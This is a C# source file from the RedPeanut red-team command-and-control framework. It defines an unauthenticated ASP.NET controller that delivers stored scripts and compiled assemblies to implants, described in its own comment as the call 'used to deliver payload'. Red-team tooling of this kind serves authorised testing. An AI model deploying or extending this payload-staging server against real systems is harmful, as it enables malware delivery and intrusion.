//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System;
using System.IO;
using static RedPeanut.Utility;

namespace RedPeanut
{


    [AllowAnonymous]
    public class HttpDynamicController : ControllerBase
    {
        private readonly RedPeanutDBContext dbContext = new RedPeanutDBContext(new DbContextOptions<RedPeanutDBContext>());

        private readonly IHttpContextAccessor httpContextAccessor;

        public HttpDynamicController(IHttpContextAccessor httpContextAccessor)
        {
            this.httpContextAccessor = httpContextAccessor;
        }

        [AllowAnonymous]
        [HttpGet()]
        public ActionResult<string> Get(string filename)
        {
            Console.WriteLine("[*] Get content");
            // Api call used to deliver payload
            if (string.IsNullOrEmpty(filename))
            {

                Console.WriteLine("[x] File not found: null or empty filename");
                return NotFound();
            }

            if (RedPeanutC2.server.GetWebResource(filename, dbContext) == null)
            {
                Console.WriteLine("[x] File not found: resource not found");
                return NotFound();
            }
            else
            {
                try
                {
                    if (RedPeanutC2.server.GetWebResource(filename, dbContext).WebResourceType == Models.WebResourceType.Script)
                    {
                        string resurce = RedPeanutC2.server.GetWebResource(filename, dbContext).Content;
                        return Ok(resurce);
                    }
                    else
                    {
                        string file = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, ASSEMBLY_OIUTPUT_FOLDER, SanitizeFilename(filename));

                        if (!System.IO.File.Exists(file))
                        {
                            Console.WriteLine("[x] Assembly requested not found");
                            Models.WebResource webResource = RedPeanutC2.server.GetWebResource(filename, dbContext);
                            Console.WriteLine("[x] {0} {1} {2} {3}", webResource.Uri, webResource.WebResourceType, webResource.FileName, webResource.Content);
                            return NotFound();
                        }
                        else
                        {
                            try
                            {
                                byte[] resurce = System.IO.File.ReadAllBytes(file);
                                return File(resurce, "application/octet-stream");
                            }
                            catch (Exception)
                            {
                                Console.WriteLine("[x] Error reading assembly");
                                return NotFound();
                            }
                        }
                    }
                }
                catch (Exception)
                {
                    Console.WriteLine("[x] Generic error");
                    return NotFound();
                }
            }
        }

        private string SanitizeFilename(string filename)
        {
            return filename.Replace("\\", "")
                .Replace("/", "")
                .Replace("..", "");
        }
    }
}